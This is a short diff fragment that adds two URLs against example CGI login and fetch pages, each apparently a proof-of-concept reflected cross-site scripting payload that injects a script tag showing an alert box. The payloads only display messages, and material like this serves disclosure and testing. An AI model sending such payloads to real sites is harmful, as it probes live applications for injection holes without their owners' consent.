@@ -1,0 +1,2 @@
+http://cmc.example.com/cmclogin.cgi?Fredo=%3Cscript%3Ealert(&#039;You%20broke%20my%20heart.You%20broke%20my%20heart&#039;);%3C/script%3E
+http://cmc.example.com/cmcget.cgi?46010%3CSCRIPT%3Ealert(&#039;I%20know%20it%20was%20you.&#039;);%3C/SCRIPT%3E
